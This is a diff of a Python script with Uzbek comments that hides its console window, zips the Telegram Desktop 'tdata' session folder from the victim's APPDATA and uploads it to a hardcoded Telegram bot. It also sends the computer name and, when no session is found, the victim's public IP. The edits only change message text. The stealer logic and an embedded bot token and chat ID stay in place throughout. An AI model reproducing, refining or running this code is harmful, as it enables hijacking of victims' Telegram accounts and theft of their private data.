@@ -6,16 +6,14 @@ import socket
 import tempfile
 import time
 
-# Qora oynani yashirish
+# Qora oynani yashirish (Kompyuterda Python o'rnatilgan bo'lsa ishlaydi)
 if os.name == 'nt':
     import ctypes
     ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
-# Ma'lumotlar (Token va ID)
 BOT_TOKEN = "8474648259:AAH3sMxwJCPwkit40x--YgvETDLkZ0jmgu4"
 CHAT_ID = 7080045924
 
-# --- Yordamchi funksiyalar ---
 def send_telegram_message(text):
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
@@ -43,7 +41,6 @@ def zip_folder(folder_path, output_path):
                 except:
                     pass
 
-# --- Asosiy ish ---
 def main():
     pc_name = socket.gethostname()
     appdata = os.getenv('APPDATA')
@@ -58,14 +55,14 @@ def main():
             if os.path.exists(zip_path):
                 os.remove(zip_path)
             
-            send_telegram_message(f"⏳ Kompyuter: `{pc_name}` da tdata siqilmoqda...")
+            send_telegram_message(f"⏳ Kompyuter: {pc_name} da tdata siqilmoqda...")
             zip_folder(tdata_path, zip_path)
             
             file_size_mb = os.path.getsize(zip_path) / (1024 * 1024)
             if file_size_mb < 49:
-                send_telegram_file(zip_path, f"✅ Yangi tdata yig'ildi!\n🖥 Kompyuter: `{pc_name}`\n📦 Hajmi: {file_size_mb:.2f} MB")
+                send_telegram_file(zip_path, f"✅ Yangi tdata yig'ildi! Kompyuter: {pc_name}, Hajmi: {file_size_mb:.2f} MB")
             else:
-                send_telegram_message(f"⚠️ tdata juda katta ({file_size_mb:.2f} MB)")
+                send_telegram_message(f"⚠️ tdata juda katta ({file_size_mb:.2f} MB), yuborilmadi!")
             
             os.remove(zip_path)
         except Exception as e:
@@ -73,7 +70,7 @@ def main():
     else:
         try:
             ip = requests.get('https://api.ipify.org').text
-            send_telegram_message(f"⚠️ tdata topilmadi!\n🖥 Nom: `{pc_name}`\n🌐 IP: {ip}")
+            send_telegram_message(f"⚠️ tdata topilmadi! Kompyuter: {pc_name}, IP: {ip}")
         except:
             pass
 
